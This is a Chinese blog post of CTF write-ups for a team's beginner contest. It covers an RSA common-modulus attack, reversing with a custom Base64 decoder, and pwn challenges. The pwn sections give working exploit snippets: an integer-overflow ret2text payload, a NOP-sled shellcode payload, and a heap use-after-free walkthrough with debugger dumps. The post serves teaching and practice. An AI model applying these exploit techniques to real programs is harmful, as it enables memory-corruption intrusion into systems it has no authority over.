<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>MetasequoiaCTF2020 部分题解 - Lab on Mercury</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Lab on Mercury"><meta name="msapplication-TileImage" content="/img/favicon.png"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Lab on Mercury"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta description="第一次出题，经验不足，感谢参赛选手海涵。"><meta property="og:type" content="blog"><meta property="og:title" content="MetasequoiaCTF2020 部分题解"><meta property="og:url" content="https://signormercurio.me/post/MetasequoiaCTF2020/"><meta property="og:site_name" content="Lab on Mercury"><meta property="og:description" content="第一次出题，经验不足，感谢参赛选手海涵。"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://i.loli.net/2020/08/19/32QJLgRY5hrKNVi.png"><meta property="article:published_time" content="2020-02-15T08:52:16.000Z"><meta property="article:author" content="Mercury"><meta property="article:tag" content="整数溢出"><meta property="article:tag" content="double-free"><meta property="article:tag" content="RSA"><meta property="article:tag" content="ROP"><meta property="article:tag" content="编码"><meta property="article:tag" content="Java"><meta property="article:tag" content="nop-sled"><meta property="article:tag" content="jwt"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="https://i.loli.net/2020/08/19/32QJLgRY5hrKNVi.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://signormercurio.me/post/MetasequoiaCTF2020/"},"headline":"Lab on Mercury","image":["https://i.loli.net/2020/08/19/32QJLgRY5hrKNVi.png"],"datePublished":"2020-02-15T08:52:16.000Z","author":{"@type":"Person","name":"Mercury"},"description":"第一次出题，经验不足，感谢参赛选手海涵。"}</script><link rel="canonical" href="https://signormercurio.me/post/MetasequoiaCTF2020/"><link rel="alternate" href="/atom.xml" title="Lab on Mercury" type="application/atom+xml"><link rel="icon" href="/img/favicon.png"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css"><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><meta name="generator" content="Hexo 5.2.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/favicon.png" alt="Lab on Mercury" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a></div><div class="navbar-end"><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><div class="card-image"><span class="image is-7by3"><img class="fill" src="https://i.loli.net/2020/08/19/32QJLgRY5hrKNVi.png" alt="MetasequoiaCTF2020 部分题解"></span></div><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2020-02-15T08:52:16.000Z" title="2020-02-15T08:52:16.000Z">2020-02-15</time></span><span class="level-item"><a class="link-muted" href="/categories/%E5%AE%89%E5%85%A8/">安全</a><span> / </span><a class="link-muted" href="/categories/%E5%AE%89%E5%85%A8/%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/">比赛记录</a></span><span class="level-item">21 minutes read (About 3201 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">MetasequoiaCTF2020 部分题解</h1><div class="content"><p>第一次出题，经验不足，感谢参赛选手海涵。</p>
<a id="more"></a>

<p>这次给队内新人赛出题，题目设置得比较简单，共有：</p>
<ul>
<li>Web * 5</li>
<li>Pwn * 5</li>
<li>Misc * 4</li>
<li>Crypto * 3</li>
<li>Reverse * 3</li>
</ul>
<p>我负责出 Pwn 和 Reverse、Crypto 的签到题、以及两题 Web。这里就写下我负责出的题的 wp。</p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Ridicule"><a href="#Ridicule" class="headerlink" title="Ridicule"></a>Ridicule</h3><p>首先是没有绕任何弯的 RSA 共模攻击。题目描述说同一条消息发送了两次，可以很容易想到这个方法。原理详见<a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_module_attack-zh/#_6">CTF Wiki</a>。</p>
<p>这里给出加密和解密的脚本：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># enc</span></span><br><span class="line">n_length = <span class="number">2048</span></span><br><span class="line">p = number.getPrime(n_length)</span><br><span class="line">q = number.getPrime(n_length)</span><br><span class="line">n = p*q</span><br><span class="line">print(n)</span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">e1 = <span class="number">65537</span></span><br><span class="line">e2 = <span class="number">395327</span></span><br><span class="line">d1 = invert(e1,phi)</span><br><span class="line">d2 = invert(e2,phi)</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag = b&#x27;flag&#123;rS4_c0mOon_MOdu1u5_a7k&#125;&#x27;</span></span><br><span class="line">flag = <span class="string">b&#x27;7=28LC$c04_&gt;~@?0|~5F`Fd02f&lt;N&#x27;</span></span><br><span class="line">flag = number.bytes_to_long(flag)</span><br><span class="line">c1 = powmod(flag,e1,n)</span><br><span class="line">c2 = powmod(flag,e2,n)</span><br><span class="line">print(c1)</span><br><span class="line">print(c2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dec</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exgcd</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> b==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    x2, y2, r = exgcd(b, a%b)</span><br><span class="line">    x1 = y2</span><br><span class="line">    y1 = x2-(a//b)*y2</span><br><span class="line">    <span class="keyword">return</span> x1, y1, r</span><br><span class="line"></span><br><span class="line">s1,s2,t = exgcd(e1,e2)</span><br><span class="line">m = powmod(c1,s1,n) * powmod(c2,s2,n) % n</span><br><span class="line">print(number.long_to_bytes(m))</span><br></pre></td></tr></table></figure>

<p>在解密后得到了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7&#x3D;28LC$c04_&gt;~@?0|~5F&#96;Fd02f&lt;N</span><br></pre></td></tr></table></figure>

<p>观察密文的字符集，不难发现是 ROT47 加密，再 ROT47 一次即解密得到了 flag。</p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><p>我并不是很会出逆向，但是队伍里有同学需要做，于是这些题目基本都是有原题的。</p>
<h3 id="CMCS"><a href="#CMCS" class="headerlink" title="CMCS"></a>CMCS</h3><p>Reverse 类签到题，虽然可以静态分析出答案，还是推荐动态调试。逆向可以发现关键函数<code>sub_8048708</code>和<code>sub_8048658</code>，分析前者可知<code>eax</code>存储<code>sub_8048658</code>返回的 flag 值，因此在后者下断点调试，打印<code>eax</code>值即得到 flag。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b *0x8048658</span><br><span class="line">r</span><br><span class="line">fin</span><br><span class="line">x&#x2F;16sw $eax</span><br></pre></td></tr></table></figure>

<h3 id="Babysmali"><a href="#Babysmali" class="headerlink" title="Babysmali"></a>Babysmali</h3><p>题目给了<code>smali.jar</code>以及<code>src.smali</code>，我们先将后者汇编成<code>dex</code>文件。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar smali.jar assemble src.smali -o src.dex</span><br></pre></td></tr></table></figure>

<p>然后使用 jadx 反编译<code>dex</code>文件：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.hellosmali.hellosmali;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Digest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">check</span><span class="params">(String input)</span> </span>&#123;</span><br><span class="line">        String str = <span class="string">&quot;+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span> || input.length() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">char</span>[] charinput = input.toCharArray();</span><br><span class="line">        StringBuilder v2 = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span> toBinaryString : charinput) &#123;</span><br><span class="line">            String intinput = Integer.toBinaryString(toBinaryString);</span><br><span class="line">            <span class="keyword">while</span> (intinput.length() &lt; <span class="number">8</span>) &#123;</span><br><span class="line">                intinput = <span class="string">&quot;0&quot;</span> + intinput;</span><br><span class="line">            &#125;</span><br><span class="line">            v2.append(intinput);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (v2.length() % <span class="number">6</span> != <span class="number">0</span>) &#123;</span><br><span class="line">            v2.append(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        String v1 = String.valueOf(v2);</span><br><span class="line">        <span class="keyword">char</span>[] v4 = <span class="keyword">new</span> <span class="keyword">char</span>[(v1.length() / <span class="number">6</span>)];</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; v4.length; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> v6 = Integer.parseInt(v1.substring(<span class="number">0</span>, <span class="number">6</span>), <span class="number">2</span>);</span><br><span class="line">            v1 = v1.substring(<span class="number">6</span>);</span><br><span class="line">            v4[i] = str.charAt(v6);</span><br><span class="line">        &#125;</span><br><span class="line">        StringBuilder v3 = <span class="keyword">new</span> StringBuilder(String.valueOf(v4));</span><br><span class="line">        <span class="keyword">if</span> (input.length() % <span class="number">3</span> == <span class="number">1</span>) &#123;</span><br><span class="line">            v3.append(<span class="string">&quot;!?&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (input.length() % <span class="number">3</span> == <span class="number">2</span>) &#123;</span><br><span class="line">            v3.append(<span class="string">&quot;!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (String.valueOf(v3).equals(<span class="string">&quot;xsZDluYYreJDyrpDpucZCo!?&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从字符集可以看出和 Base64 编码有关，实际上只是它的一个变种。既可以用 python 解，也可以用 java 解，python 版：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">base64_charset = <span class="string">&#x27;+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">base64_str</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    解码base64字符串</span></span><br><span class="line"><span class="string">    :param base64_str:base64字符串</span></span><br><span class="line"><span class="string">    :return:解码后的bytearray；若入参不是合法base64字符串，返回空bytearray</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 对每一个base64字符取下标索引，并转换为6为二进制字符串</span></span><br><span class="line">    base64_bytes = [<span class="string">&#x27;&#123;:0&gt;6&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="built_in">bin</span>(base64_charset.index(s))).replace(<span class="string">&#x27;0b&#x27;</span>, <span class="string">&#x27;&#x27;</span>)) <span class="keyword">for</span> s <span class="keyword">in</span> base64_str <span class="keyword">if</span></span><br><span class="line">                    s != <span class="string">&#x27;=&#x27;</span>]</span><br><span class="line">    resp = <span class="built_in">bytearray</span>()</span><br><span class="line">    nums = <span class="built_in">len</span>(base64_bytes) // <span class="number">4</span></span><br><span class="line">    remain = <span class="built_in">len</span>(base64_bytes) % <span class="number">4</span></span><br><span class="line">    integral_part = base64_bytes[<span class="number">0</span>:<span class="number">4</span> * nums]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> integral_part:</span><br><span class="line">        <span class="comment"># 取4个6位base64字符，作为3个字节</span></span><br><span class="line">        tmp_unit = <span class="string">&#x27;&#x27;</span>.join(integral_part[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">        tmp_unit = [<span class="built_in">int</span>(tmp_unit[x: x + <span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">8</span>, <span class="number">16</span>]]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> tmp_unit:</span><br><span class="line">            resp.append(i)</span><br><span class="line">        integral_part = integral_part[<span class="number">4</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> remain:</span><br><span class="line">        remain_part = <span class="string">&#x27;&#x27;</span>.join(base64_bytes[nums * <span class="number">4</span>:])</span><br><span class="line">        tmp_unit = [<span class="built_in">int</span>(remain_part[i * <span class="number">8</span>:(i + <span class="number">1</span>) * <span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(remain - <span class="number">1</span>)]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> tmp_unit:</span><br><span class="line">            resp.append(i)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span> decode(<span class="string">&#x27;A0NDlKJLv0hTA1lDAuZRgo==&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>java 版：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">XMan</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String v6 = <span class="string">&quot;+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;</span><br><span class="line">        String s = <span class="string">&quot;xsZDluYYreJDyrpDpucZCo&quot;</span>;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.length(); i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> tmp = v6.indexOf(s.charAt(i));</span><br><span class="line">            String ss = Integer.toBinaryString(tmp);</span><br><span class="line">            <span class="keyword">if</span> (ss.length() == <span class="number">5</span>) &#123;</span><br><span class="line">                ss = <span class="string">&quot;0&quot;</span> + ss;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ss.length() == <span class="number">4</span>) &#123;</span><br><span class="line">                ss = <span class="string">&quot;00&quot;</span> + ss;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ss.length() == <span class="number">3</span>) &#123;</span><br><span class="line">                ss = <span class="string">&quot;000&quot;</span> + ss;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ss.length() == <span class="number">2</span>) &#123;</span><br><span class="line">                ss = <span class="string">&quot;0000&quot;</span> + ss;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ss.length() == <span class="number">1</span>) &#123;</span><br><span class="line">                ss = <span class="string">&quot;00000&quot;</span> + ss;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ss.length() == <span class="number">0</span>) &#123;</span><br><span class="line">                ss = <span class="string">&quot;000000&quot;</span> + ss;</span><br><span class="line">            &#125;</span><br><span class="line">            sb.append(ss);</span><br><span class="line">        &#125;</span><br><span class="line">        String x = sb.toString() + <span class="string">&quot;0000&quot;</span>;</span><br><span class="line">        StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; x.length(); i += <span class="number">8</span>) &#123;</span><br><span class="line">            String tmp = x.substring(i, i + <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">byte</span> b = (<span class="keyword">byte</span>) Integer.parseInt(tmp, <span class="number">2</span>);</span><br><span class="line">            stringBuilder.append((<span class="keyword">char</span>) b);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(stringBuilder.toString());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Prison"><a href="#Prison" class="headerlink" title="Prison"></a>Prison</h3><p>这是一道纯迷宫题，只是工作量有点大。<a target="_blank" rel="noopener" href="https://singularityctf.blogspot.com/2014/03/volgactf-quals-2014-writeup-reverse-100.html">参考 WP</a>。</p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>所有题目均为 64 位程序，libc 版本 2.23。</p>
<h3 id="Blacksmith"><a href="#Blacksmith" class="headerlink" title="Blacksmith"></a>Blacksmith</h3><p>Pwn 类签到题。本题的输出让这题看上去像堆题，但实际上只有第一个锻造剑的功能是有实际作用的。可以看到在给剑命名时，首先要输入名字长度，如果长度超过<code>0x40</code>则失败。但是注意到名字长度这个变量是无符号的，因此可以整数溢出：输入<code>-1</code>，则可输入<code>0xffffffffffffffff</code>字符，绕过了这个判断。</p>
<p>随后就可以栈溢出了，程序中存在后门函数，直接<code>ret2text</code>。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sla(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;name?\n&#x27;</span>,<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span>,<span class="number">0x4007d6</span>)</span><br><span class="line">sla(<span class="string">&#x27;is?\n&#x27;</span>,payload)</span><br></pre></td></tr></table></figure>

<h3 id="Snow-Mountain"><a href="#Snow-Mountain" class="headerlink" title="Snow Mountain"></a>Snow Mountain</h3><p>这题关闭了 NX 保护，说明需要布置 shellcode，难点在于找到 shellcode 位置。程序首先给出一个栈上的随机地址，并且栈上存在一个<code>0x1000</code>的字符数组。根据题目提示”滑雪”、”雪橇”等，容易想到利用 nop sled 滑到 shellcode 的位置来增加容错率。想到 nop sled 的话这题就做完了。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ru(<span class="string">&#x27;position: 0x&#x27;</span>)</span><br><span class="line">cur = <span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&#x27;cur&#x27;</span>,cur)</span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">payload = payload.rjust(<span class="number">0x1000</span><span class="number">-1</span>,<span class="string">&#x27;\x90&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt; &#x27;</span>,payload)</span><br><span class="line">sla(<span class="string">&#x27;&gt; &#x27;</span>,<span class="built_in">hex</span>(cur))</span><br></pre></td></tr></table></figure>

<h3 id="Summoner"><a href="#Summoner" class="headerlink" title="Summoner"></a>Summoner</h3><p>本次比赛唯二的堆题，但是极其简单。邪恶召唤师召唤了一只 5 级生物，但是你只能召唤四级生物，你的目的就是修改生物的等级为 5 级。</p>
<p>题目提供了几种命令：</p>
<ul>
<li>展示召唤物信息</li>
<li>召唤一只生物，并给它起名字</li>
<li>设置生物的等级，但必须小于 5</li>
<li>攻击敌方召唤物</li>
<li>释放召唤物</li>
</ul>
<p>我们通过逆向可以得知，召唤物的结构体长这样：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">creature</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">int</span> level;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>随后可以发现两处漏洞：</p>
<ul>
<li>召唤时，输入的<code>name</code>使用<code>strdup</code>函数（隐式调用了<code>malloc</code>），但并没有检查长度，因此可以溢出到下一个 8 字节处。</li>
<li>在释放召唤物时，只会调用<code>free(c-&gt;name)</code>，然后将结构体指针置空，但并不会释放结构体指针本身。</li>
</ul>
<p>因此我们尝试先召唤一个名为<code>aaaaaaaa\x05</code>的生物，此时堆结构如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heapls</span><br><span class="line">           ADDR             SIZE            STATUS</span><br><span class="line">sbrk_base  0x56476bb24000</span><br><span class="line">chunk      0x56476bb24000   0x1010          (inuse)</span><br><span class="line">chunk      0x56476bb25010   0x20            (inuse)</span><br><span class="line">chunk      0x56476bb25030   0x20            (inuse)</span><br><span class="line">chunk      0x56476bb25050   0x20fb0         (top)</span><br><span class="line">sbrk_end   0x56476bb46000</span><br><span class="line">pwndbg&gt; x/8gx 0x56476bb25010</span><br><span class="line">0x56476bb25010:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x56476bb25020:	0x000056476bb25040	0x0000000000000000</span><br><span class="line">0x56476bb25030:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x56476bb25040:	0x6161616161616161	0x0000000000000005</span><br></pre></td></tr></table></figure>

<p>可以看到有 2 块 0x20 的 chunk，第一块是结构体指针，存放着<code>name</code>地址和<code>level</code>数值；第二块就是<code>name</code>了，存放着我们输入的<code>name</code>，注意这时第二个 8 字节已经是 5 了。随后我们释放召唤物：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;8gx 0x5621c569e010</span><br><span class="line">0x5621c569e010:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5621c569e020:	0x00005621c569e040	0x0000000000000000</span><br><span class="line">0x5621c569e030:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5621c569e040:	0x0000000000000000	0x0000000000000005</span><br></pre></td></tr></table></figure>

<p>这时<code>name</code>被<code>free</code>了但指针还在，我们刚刚写的<code>\x05</code>也还在。这时再召唤就能得到<code>0x5621c569e030</code>处的一块 chunk 作为结构体指针，而新的<code>name</code>跑到了<code>0x55feced35050</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;12gx 0x55feced35010</span><br><span class="line">0x55feced35010:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55feced35020:	0x000055feced35040	0x0000000000000000</span><br><span class="line">0x55feced35030:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55feced35040:	0x000055feced35060	0x0000000000000005</span><br><span class="line">0x55feced35050:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55feced35060:	0x0000000000000061	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>于是此时，结构体指针里的<code>level</code>就变成了 5。</p>
